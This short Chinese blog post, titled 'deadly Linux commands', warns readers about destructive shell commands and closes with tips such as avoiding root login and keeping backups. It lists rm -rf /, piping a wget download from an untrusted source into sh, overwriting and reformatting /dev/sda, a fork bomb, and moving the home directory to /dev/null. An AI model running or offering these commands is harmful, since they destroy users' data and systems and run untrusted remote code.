---
layout: article
title: 致命的linux命令
---

[原文](https://www.ituring.com.cn/article/21012)

```
rm -rf / 
wget http://某个不信任的源 -O- | sh
任意命令 > /dev/sda 
mkfs.ext3 /dev/sda
:(){:|:&};:  //fork炸单
mv /home/yourhomedirectory/* /dev/null 
```


注意
```
避免使用root用户登陆
-为home目录建立独立的分区
-建立合理的用户分组
-定时的备份数据
```
